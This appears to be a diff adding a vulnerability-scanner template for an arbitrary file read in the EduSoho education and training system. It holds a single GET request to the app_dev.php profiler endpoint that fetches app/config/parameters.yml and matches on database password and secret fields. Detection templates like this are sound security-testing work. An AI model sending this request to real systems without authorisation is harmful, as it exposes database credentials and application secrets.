@@ -1,0 +1,24 @@
+id: edusoho-app-devphp-file-read
+info:
+  name: EduSoho Education and Training System app_dev.php Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-read
+  metadata:
+    product: EduSoho Education and Training System
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/app_dev.php/_profiler/open?file=app/config/parameters.yml"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "database_driver"
+          - "secret"
+          - "database_password"
+      - type: status
+        status:
+          - 200
